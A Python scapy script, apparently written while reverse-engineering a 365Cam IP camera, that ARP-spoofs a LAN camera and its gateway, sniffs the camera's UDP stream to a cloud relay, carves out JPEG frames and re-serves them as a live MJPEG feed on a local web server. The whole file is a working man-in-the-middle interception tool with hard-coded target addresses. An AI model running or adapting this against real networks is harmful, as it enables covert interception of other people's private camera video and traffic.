#!/usr/bin/env python3
"""
Working approach: spoof camera AND gateway, extract JPEGs directly.
"""
from scapy.all import *
import threading, time, os

CAM, GW, RELAY = "192.168.1.148", "192.168.1.1", "49.237.71.144"
OUT = r"E:\open_camera\apk_analysis\frames"
os.makedirs(OUT, exist_ok=True)

conf.verb = 0
my_mac = "9c:6b:00:cf:27:e7"
running = True
fcount = 0
latest = b''

def spoof():
    cmac = getmacbyip(CAM) or "ff:ff:ff:ff:ff:ff"
    gmac = getmacbyip(GW) or "ff:ff:ff:ff:ff:ff"
    print(f"ARP: cam={cmac} gw={gmac}")
    while running:
        send(ARP(op=2, pdst=CAM, hwdst=cmac, psrc=GW, hwsrc=my_mac), verbose=False)
        send(ARP(op=2, pdst=GW, hwdst=gmac, psrc=CAM, hwsrc=my_mac), verbose=False)
        time.sleep(0.5)

def handle(pkt):
    global fcount, latest
    if not (IP in pkt and UDP in pkt): return
    if pkt[IP].src != CAM or pkt[IP].dst != RELAY: return
    pl = bytes(pkt[UDP].payload)
    if len(pl) < 100: return
    soi = pl.find(b'\xff\xd8\xff')
    if soi < 0: return
    eoi = pl.rfind(b'\xff\xd9')
    if eoi < soi + 200: return
    jpg = pl[soi:eoi+2]
    fcount += 1
    with open(os.path.join(OUT, f"f{fcount:05d}.jpg"), 'wb') as f:
        f.write(jpg)
    latest = jpg
    if fcount % 5 == 0: print(f"[{fcount}] {len(jpg)}b")

def srv():
    from http.server import HTTPServer, BaseHTTPRequestHandler
    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/mjpg':
                self.send_response(200)
                self.send_header('Content-Type', 'multipart/x-mixed-replace; boundary=X')
                self.end_headers()
                o = 0
                while running:
                    global fcount, latest
                    if fcount > o and latest:
                        self.wfile.write(b'--X\r\nContent-Type: image/jpeg\r\n')
                        self.wfile.write(f'Content-Length: {len(latest)}\r\n\r\n'.encode())
                        self.wfile.write(latest); self.wfile.write(b'\r\n')
                        o = fcount
                    time.sleep(0.05)
            elif self.path == '/':
                self.send_response(200); self.end_headers()
                self.wfile.write(f'<html><body><img src="/mjpg" style="max-width:100%"><br>Frames: {fcount}</body></html>'.encode())
    HTTPServer(('0.0.0.0', 8080), H).serve_forever()

print(f"{CAM} -> {RELAY}:22036")
threading.Thread(target=spoof, daemon=True).start()
threading.Thread(target=srv, daemon=True).start()
time.sleep(1)
print("[*] Open 365Cam app NOW! http://localhost:8080")

try:
    sniff(filter=f"host {CAM}", prn=handle, store=False)
except KeyboardInterrupt: pass
finally:
    running = False
    print(f"\nDone. {fcount} frames")
